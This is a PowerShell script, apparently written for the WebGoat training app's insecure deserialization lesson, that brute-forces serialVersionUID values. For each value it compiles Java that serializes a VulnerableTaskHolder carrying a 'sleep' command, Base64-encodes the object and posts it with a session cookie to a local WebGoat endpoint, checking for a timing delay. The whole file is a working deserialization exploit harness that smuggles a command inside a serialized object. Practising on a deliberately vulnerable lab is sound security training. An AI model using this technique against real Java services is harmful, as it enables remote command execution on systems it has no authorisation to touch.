# ============================================================
# Find the correct serialVersionUID by trying MANY values
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Extended serialVersionUID Brute Force" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Testing negative values, large values, and special numbers..." -ForegroundColor Yellow
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Extended list including negative numbers and special values
$versions = @(
    # Small positive
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
    # Negative
    -1, -2, -3, -5, -10, -100,
    # Special numbers
    42, 69, 100, 123, 256, 420, 512, 666, 1000, 1024, 1337, 1234, 4321,
    # Years
    2020, 2021, 2022, 2023, 2024, 2025,
    # Large numbers
    9999, 10000, 12345, 54321, 99999,
    # Hex-friendly
    0xFF, 0x100, 0x1000, 0x10000,
    # Common Java UIDs
    [long]1234567890, [long]-1234567890,
    # Hash-like
    [long]0x0123456789ABCDEF
)

$count = 0
$total = $versions.Count

foreach ($version in $versions) {
    $count++
    Write-Host "[$count/$total] Testing version $version..." -ForegroundColor Yellow -NoNewline
    
    # Generate Java code
    $javaCode = @"
import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = ${version}L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class Test${count} {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "DelayTask", 5000);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
        } catch (Exception e) {}
    }
}
"@
    
    $javaCode | Out-File -FilePath "c:\webgoat-scripts-1\Test${count}.java" -Encoding ASCII
    $null = javac "c:\webgoat-scripts-1\Test${count}.java" 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        $payload = java -cp "c:\webgoat-scripts-1" "Test${count}" 2>&1 | Select-Object -Last 1
        
        if ($payload -match "^[A-Za-z0-9+/=]+$") {
            $body = "token=$payload"
            
            try {
                $startTime = Get-Date
                
                $response = Invoke-WebRequest `
                    -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
                    -Method POST `
                    -Headers $headers `
                    -Body $body `
                    -UseBasicParsing `
                    -TimeoutSec 10
                
                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds
                
                $result = $response.Content | ConvertFrom-Json
                
                Write-Host " $([math]::Round($duration, 2))s" -ForegroundColor White
                
                if ($result.lessonCompleted -eq $true) {
                    Write-Host ""
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "SUCCESS with serialVersionUID = ${version}L!" -ForegroundColor Green
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "Payload: $payload" -ForegroundColor White
                    Write-Host ""
                    Write-Host "COPY THIS PAYLOAD:" -ForegroundColor Cyan
                    Write-Host $payload -ForegroundColor White
                    exit 0
                }
                
                # Check for 5-second delay
                if ($duration -ge 4.5 -and $duration -le 5.5) {
                    Write-Host "  [5-SECOND DELAY ACHIEVED!]" -ForegroundColor Green
                    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
                }
                
                # Show non-standard feedback
                if ($result.feedback -notmatch "does not match") {
                    Write-Host "  [NEW FEEDBACK] $($result.feedback)" -ForegroundColor Cyan
                }
                
            } catch {
                Write-Host " ERROR" -ForegroundColor Red
            }
        }
    }
    
    # Clean up
    Remove-Item -Force "c:\webgoat-scripts-1\Test${count}.java" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\Test${count}.class" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\VulnerableTaskHolder.class" -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Yellow
Write-Host "All versions tested - none successful" -ForegroundColor Yellow
Write-Host "=====================================" -ForegroundColor Yellow
Write-Host ""
Write-Host "This suggests the issue might be:" -ForegroundColor White
Write-Host "  1. We need the FULL package name: org.dummy.insecure.framework.VulnerableTaskHolder" -ForegroundColor Gray
Write-Host "  2. The class structure is different (different fields)" -ForegroundColor Gray
Write-Host "  3. There's a different deserialization endpoint" -ForegroundColor Gray
Write-Host ""
